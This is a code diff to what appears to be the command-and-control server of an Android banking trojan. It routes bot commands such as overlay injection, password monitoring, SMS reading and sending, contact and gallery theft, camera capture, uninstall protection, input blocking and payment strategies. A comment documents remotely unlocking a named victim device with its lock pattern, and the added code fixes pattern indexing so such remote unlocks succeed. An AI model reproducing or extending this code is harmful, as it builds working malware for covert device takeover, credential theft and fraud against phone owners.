+  // 现场验证（设备 84012b2ae791b123 / SM-G981V，锁屏图案 1-2-3-5-7）：
+  //   面板输入 1,2,3,5,7  → 设备画出 2-3-4-5-6-8   （错误，每个点 +1）
+  //   面板输入 0,1,2,4,6  → 设备画出 1-2-3-5-7     （正确，成功解锁）
+  // 无障碍 APK 把 pattern 里的每个数字当成 3x3 九宫格的 0-based 下标，
+  // 而面板提示和操作习惯都是 1-based。
+  //
+  // 日志实证（RLOG2 抓到的原始帧）：
+  //   {"type":"command","sessionId":"84012b2ae791b123",
+  //    "data":{"command":"UNLOCK_DEVICE",
+  //            "params":{"pattern":[1,2,3,5,7],"screenWidth":1080,"screenHeight":2400}}}
+  // 即：前端确实原样发送 1-based 数组，路由与转发均正常（result=sent），
+  //     问题只在数值本身。因此这里【仅】改写 pattern 的数值，
+  //     不改路由、不改目标、不改其他命令。
+  //
+  // 仅在「所有点都 >= 1」时做 -1；已经含 0 的输入视为 0-based 原样放行，
+  // 这样已知可用的 0,1,2,4,6 输入继续有效。
+  if (cmdName === 'UNLOCK_DEVICE' && data) {
+    const unlockParams = (data.params && typeof data.params === 'object') ? data.params
+      : (data.data && data.data.params && typeof data.data.params === 'object') ? data.data.params
+        : null;
+    if (unlockParams && Array.isArray(unlockParams.pattern) && unlockParams.pattern.length > 0) {
+      const pts = unlockParams.pattern
+        .map(v => Number(v))
+        .filter(n => Number.isFinite(n));
+      if (pts.length === unlockParams.pattern.length && pts.every(n => n >= 1 && n <= 9)) {
+        const before = JSON.stringify(unlockParams.pattern);
+        unlockParams.pattern = pts.map(n => n - 1);
+        if (VERBOSE_WS_MESSAGE_LOGS) {
+          console.log(`[WS-Route] UNLOCK_DEVICE pattern ${before} -> ${JSON.stringify(unlockParams.pattern)} (1-based -> 0-based)`);
+        }
+      }
+    }
+  }
+
+  // Bridge 专属命令（仅发给 bridge）
+  const bridgeOnlyCommands = ['adb_shell', 'adb_tunnel', 'INSTALL_APK', 'FILE_PUSH', 'FILE_PULL'];
+  // Device（无障碍）专属命令（仅发给 device，不发 bridge）
+  const deviceOnlyCommands = [
+    'POWER_SLEEP', 'POWER_WAKE', 'SCREEN_CAPTURE', 'SCREEN_CAPTURE_STOP', 'SCREEN_CAPTURE_START',
+    'SCREEN_RECORD', 'SCREEN_RECORD_START', 'SCREEN_RECORD_STOP',
+    'SCREENCAST', 'SYSTEM_SCREENCAST', 'STOP_SCREENCAST', 'SCREEN_CAPTURE_SET_TECH',
+    'SCREEN_CAPTURE_RESUME', 'SCREEN_CAPTURE_PAUSE', 'SCREEN_CAPTURE_DISABLE',
+    'SCREEN_QUALITY',
+    'CAMERA_STOP', 'CAMERA_START', 'CAMERA_CAPTURE',
+    'GET_UI_HIERARCHY', 'GET_READER_DATA', 'READER_START', 'READER_STOP',
+    'SHOW_INJECTION', 'STOP_INJECTION', 'GET_PASSWORD_STATUS',
+    'ENABLE_PASSWORD_MONITORING', 'DISABLE_PASSWORD_MONITORING',
+    'ENABLE_UNINSTALL_PROTECTION', 'DISABLE_UNINSTALL_PROTECTION',
+    'DEPLOY_LOCAL_SERVICE', 'DEPLOY_DXS', 'REINSTALL_SCREENCAST', 'REINSTALL_SCREEN',
+    'FULL_DEPLOY', 'MUTE', 'DEVICE_BLOCK_INPUT', 'DEVICE_ALLOW_INPUT',
+    'ENABLE_BLACK_SCREEN', 'DISABLE_BLACK_SCREEN', 'SMART_NUMERIC_UNLOCK', 'UNLOCK_DEVICE',
+    'SET_PAYMENT_STRATEGIES', 'SET_SENSITIVE_APPS', 'SET_BLACK_APPS',
+    'lockScreen', 'SCREEN_OFF', 'SYSTEM_LOCK_SCREEN', 'home', 'back', 'recent',
+    'swipe', 'SWIPE', 'SWIPE_PATH', 'swipe_path', 'TAP', 'tap', 'CLICK', 'click',
+    'GET_PERMISSIONS', 'REQUEST_PERMISSION', 'SMS_READ', 'SMS_SEND',
+    'GET_CONTACTS', 'GET_GALLERY', 'GET_APPS', 'GET_SMS',
+    'disableAccessibility', 'enableAccessibility',
+  ];
+
+  const isBridgeOnly = bridgeOnlyCommands.includes(cmdName);
+  const isDeviceOnly = deviceOnlyCommands.includes(cmdName);
+  const isHighVolumeCommand = HIGH_VOLUME_COMMANDS.has(String(cmdName || '').toLowerCase());
+
+  // 发送给 Device（APK 无障碍服务）
+  if (!isBridgeOnly && device && device.ws.readyState === 1) {
+    // APK 期望: { type: 'command', sessionId, data: { command, params } }
+    const cmdPayload = JSON.stringify({ type: 'command', sessionId: deviceId, data });
+    try {
+      device.ws.send(cmdPayload);
+      sent = true;
+      if (VERBOSE_WS_MESSAGE_LOGS && !isHighVolumeCommand) {
+        console.log(`[WS-Route] device=${deviceId} command=${cmdName} target=device result=sent`);
+      }
+    } catch (err) {
+      console.warn(`[WS-Route] device=${deviceId} command=${cmdName} target=device result=failed reason=${err.message}`);
+    }
+  }
+
+  // 发送给 Bridge（local-service）
+  if (!isDeviceOnly && bridge && bridge.ws.readyState === 1) {
+    let bridgePayload;
+    if (data && data.command) {
+      bridgePayload = { command: data.command, params: data.params || {} };
+    } else if (data && data.data && data.data.command) {
+      bridgePayload = { command: data.data.command, params: data.data.params || {} };
+    } else {
+      bridgePayload = data;
+    }
+    const bridgeStr = JSON.stringify(bridgePayload);
+    try {
+      bridge.ws.send(bridgeStr);
+      sent = true;
+      if (VERBOSE_WS_MESSAGE_LOGS && !isHighVolumeCommand) {
+        console.log(`[WS-Route] device=${deviceId} command=${cmdName} target=bridge result=sent`);
+      }
+    } catch (err) {
+      console.warn(`[WS-Route] device=${deviceId} command=${cmdName} target=bridge result=failed reason=${err.message}`);
+    }
+  }
+
+  if (!sent) {
+    let reason = 'socket_not_open';
+    if (isDeviceOnly) reason = !device ? 'device_not_connected' : `device_socket_state_${device.ws.readyState}`;
+    else if (isBridgeOnly) reason = !bridge ? 'bridge_not_connected' : `bridge_socket_state_${bridge.ws.readyState}`;
+    else if (!device && !bridge) reason = 'no_connection';
+    console.warn(`[WS-Route] device=${deviceId} command=${cmdName} result=NO_ROUTE reason=${reason} deviceState=${device?.ws?.readyState ?? 'missing'} bridgeState=${bridge?.ws?.readyState ?? 'missing'}`);
+  }
+  return sent;
+}
+
+/**
+ * 广播消息给管理端
+ * 全局消息（bot_list、device_update、bot_online/offline）发给所有 admin
+ * 设备特定消息（有 deviceId/sessionId）只发给订阅了该设备的 admin
+ */
+function broadcastToAdmins(connections, msg) {
+  const msgDeviceId = (typeof msg === 'object')
+    ? (msg.deviceId || msg.device_id || msg.sessionId || msg.session_id || msg.botId || msg.bot_id || '')
+    : '';
+  // 全局消息类型 — 发给所有 admin
+  const globalTypes = ['bot_list', 'device_update', 'bot_online', 'bot_offline', 'device_online', 'device_offline', 'pong'];
+  const msgType = (typeof msg === 'object') ? (msg.type || '') : '';
+  const isGlobal = !msgDeviceId || globalTypes.includes(msgType);
+  const isHighVolume = isHighVolumeMessage(msg);
+  const streamMode = isHighVolume ? streamModeForMessage(msg) : '';
+  const streamOwners = streamMode && msgDeviceId
+    ? getAdminState(connections).streamOwners.get(streamKey(msgDeviceId, streamMode))
+    : null;
+  const recipients = [];
+  for (const conn of connections.admins.values()) {
+    if (conn.terminating || conn.ws.readyState !== 1) continue;
+    if (!isGlobal && streamMode) {
+      if (!streamOwners?.has(conn.tokenId)) continue;
+    } else if (!isGlobal && !conn.subscribedDevices?.has(msgDeviceId)) {
+      continue;
+    }
+    recipients.push(conn);
+  }
+
+  if (recipients.length === 0) {
+    if (isHighVolume) recordNoSubscriberDrop(connections);
+    return 0;
+  }
+
+  // Do not allocate a second full-size screenshot string until at least one
+  // live control page is subscribed to the device.
+  const payload = typeof msg === 'string' ? msg : JSON.stringify(msg);
+  const bytes = isHighVolume ? payloadBytes(payload) : 0;
+  let delivered = 0;
+  let globalBuffered = enforceGlobalAdminBufferLimit(connections);
+
+  for (const conn of recipients) {
+    const before = bufferedBytes(conn.ws);
+    if (sendToAdmin(connections, conn, payload, { highVolume: isHighVolume, globalBuffered })) {
+      delivered++;
+      globalBuffered += Math.max(0, bufferedBytes(conn.ws) - before);
+    }
+  }
+  if (isHighVolume && delivered > 0) {
+    const metrics = getAdminState(connections).metrics;
+    metrics.forwardedStreamMessages += delivered;
+    metrics.forwardedStreamBytes += bytes * delivered;
+  }
+  const quietTypes = ['status', 'heartbeat', 'device_heartbeat', 'ping', 'pong'];
+  if (VERBOSE_WS_MESSAGE_LOGS && msgDeviceId && !isHighVolume && !quietTypes.includes(String(msgType || '').toLowerCase())) {
+    console.log(`[WS-Reply] device=${msgDeviceId} type=${msgType || 'unknown'} subscribed=${recipients.length} delivered=${delivered}`);
+  }
+  return delivered;
+}
+
+/**
+ * 转发二进制帧给订阅了该设备的管理端（带节流）
+ */
+// folder-1 wire format for binary screen frames:
+//   [u8 headerLen][header json][payload]
+// The panel slices 1+headerLen and then expects the image to begin with
+// 0xFFD8 (jpeg) or 'RI' (webp); the accessibility reader expects the byte right
+// after the header to be 0x02 for a ui-hierarchy envelope. dxs hands us bare
+// JPEG, so wrap it here -- otherwise the middle (\u7cfb\u7edf\u6295\u5c4f) canvas never paints.
+const FRAME_HEADER = Buffer.from('{"f":1}', 'utf8');
+function wrapFrameEnvelope(frameData) {
+  let buf;
+  if (Buffer.isBuffer(frameData)) buf = frameData;
+  else if (frameData instanceof ArrayBuffer) buf = Buffer.from(frameData);
+  else if (ArrayBuffer.isView(frameData)) buf = Buffer.from(frameData.buffer, frameData.byteOffset, frameData.byteLength);
+  else return frameData;
+  if (buf.length < 4) return frameData;
+  const isJpeg = buf[0] === 0xff && buf[1] === 0xd8;
+  const isWebp = buf[0] === 0x52 && buf[1] === 0x49;
+  if (!isJpeg && !isWebp) return frameData;   // already enveloped / not an image
+  return Buffer.concat([Buffer.from([FRAME_HEADER.length]), FRAME_HEADER, buf]);
+}
+
+function forwardFrameToAdmins(deviceId, rawFrame, connections) {
+  const frameData = wrapFrameEnvelope(rawFrame);
+  const bytes = payloadBytes(frameData);
+  recordInboundStream(connections, bytes);
+  if (!hasStreamConsumers(connections, deviceId, 'screen_capture')) {
+    recordNoSubscriberDrop(connections, bytes);
+    return 0;
+  }
+  if (!frameThrottle.canSend(deviceId)) return;
+  let globalBuffered = enforceGlobalAdminBufferLimit(connections);
+  let delivered = 0;
+  const owners = getAdminState(connections).streamOwners.get(streamKey(deviceId, 'screen_capture'));
+
+  for (const [, conn] of connections.admins) {
+    if (conn.ws.readyState !== 1) continue;
+    if (!owners?.has(conn.tokenId)) continue;
+    const before = bufferedBytes(conn.ws);
+    if (sendToAdmin(connections, conn, frameData, { highVolume: true, globalBuffered })) {
+      delivered++;
+      globalBuffered += Math.max(0, bufferedBytes(conn.ws) - before);
+    }
+  }
+  if (delivered > 0) {
+    const metrics = getAdminState(connections).metrics;
+    metrics.forwardedStreamMessages += delivered;
+    metrics.forwardedStreamBytes += bytes * delivered;
+  }
+  return delivered;
+}
+
+async function sendDeviceList(ws, connections) {
+  try {
+    const db = getPool();
+    const [rows] = await db.query('SELECT * FROM fisher_devices ORDER BY last_seen DESC');
+    const devices = rows.map(row => {
+      const d = deviceToDict(row);
+      // 注入实时 WS 连接状态
+      const wsConn = connections ? connections.devices.has(d.deviceId) : false;
+      const bridgeConn = connections ? connections.bridges.has(d.deviceId) : false;
+      d.ws_connected = wsConn;
+      d.bridge_connected = bridgeConn;
+      // 基于 WS 实时连接判断状态（与 PHP getOnlineDevices 一致）
+      if (wsConn || bridgeConn) {
+        // 有 WS 连接 → 判断是否休眠（屏幕关闭）
+        const isScreenOn = row.is_screen_on === 1 || row.is_screen_on === true;
+        d.status = isScreenOn ? 'online' : 'sleeping';
+      } else {
+        d.status = 'offline';
+      }
+      return d;
+    });
+    const conn = [...connections.admins.values()].find(item => item.ws === ws);
+    if (!conn) return;
+    enforceGlobalAdminBufferLimit(connections);
+    // 发送 bot_list 格式（前端 ControlPage 期望此类型）
+    sendToAdmin(connections, conn, JSON.stringify({ type: 'bot_list', data: devices }));
+    // 同时发送 device_list 格式（App.jsx 使用）
+    sendToAdmin(connections, conn, JSON.stringify({ type: 'device_list', data: devices }));
+  } catch (err) {
+    console.error('[WS-Admin] sendDeviceList error:', err.message);
+  }
+}
+
+function deviceToDict(row) {
+  const deviceId = row.device_id || '';
+  const brand = (row.brand || '').toUpperCase() || 'UNKNOWN';
+  let permissions = {};
+  try {
+    let permStr = row.permissions || '{}';
+    // MySQL JSON 列可能返回 Buffer
+    if (Buffer.isBuffer(permStr)) permStr = permStr.toString('utf8');
+    if (typeof permStr === 'object' && permStr !== null) {
+      permissions = permStr; // 已经是对象
+    } else {
+      permissions = JSON.parse(permStr);
+    }
+  } catch { permissions = {}; }
+
+  // 时间戳转毫秒（前端需要毫秒级）
+  const toMs = (ts) => ts ? (ts < 10000000000 ? ts * 1000 : ts) : null;
+
+  return {
+    id: deviceId,
+    deviceId,
+    botId: deviceId,
+    name: deviceId ? `${brand}-${deviceId.slice(-8).toUpperCase()}` : '',
+    model: row.model || '',
+    osVersion: row.os_version || '',
+    appName: row.app_name || '',
+    appVersion: row.app_version || '',
+    batteryLevel: row.battery_level || 0,
+    networkType: row.network_type || '',
+    status: row.is_connected ? 'online' : 'offline',
+    localServiceConnected: !!row.local_service_connected,
+    ownerUsername: row.owner_username || '',
+    groupName: row.group_name || '',
+    permissions,
+    // 关键时间戳字段
+    lastSeen: toMs(row.last_seen),
+    lastHeartbeat: toMs(row.last_seen), // 前端优先读这个
+    firstInstallTime: toMs(row.first_seen),
+    // 其他字段
+    publicIP: row.public_ip || '',
+    phoneNumber: row.phone_number || '',
+    phoneNumber2: row.phone_number_2 || '',
+    screenWidth: row.screen_width || 0,
+    screenHeight: row.screen_height || 0,
+    hasSim: !!row.has_sim,
+    accessibilityAlive: !!row.accessibility_alive,
+    isScreenOn: !!row.is_screen_on,
+    isCharging: !!row.is_charging,
+    isLocked: !!row.is_locked,
+    geoLocation: row.geo_location || null,
+    remark: row.remark || '',
+    injection_active: !!row.injection_active,
+    adb_enabled: !!row.adb_enabled,
+    adb_wifi_enabled: !!row.adb_wifi_enabled,
+    adb_deploy_enabled: !!row.adb_deploy_enabled,
+    wifi_port: row.wifi_port || 0,
+  };
+}
+
+module.exports = {
+  handleAdmin,
+  broadcastToAdmins,
+  forwardFrameToAdmins,
+  dxsInput,
+  wrapFrameEnvelope,
+  normalizeDeviceCommand,
+  isHighVolumeMessage,
+  getAdminDeliveryMetrics,
+  hasDeviceSubscribers,
+  hasStreamConsumers,
+  streamModeForMessage,
+  recordInboundStream,
+  recordNoSubscriberDrop,
+  clearDeviceFrameState,
+  claimAdminStream,
+  releaseAdminStream,
+  cleanupAdminConnection,
+};
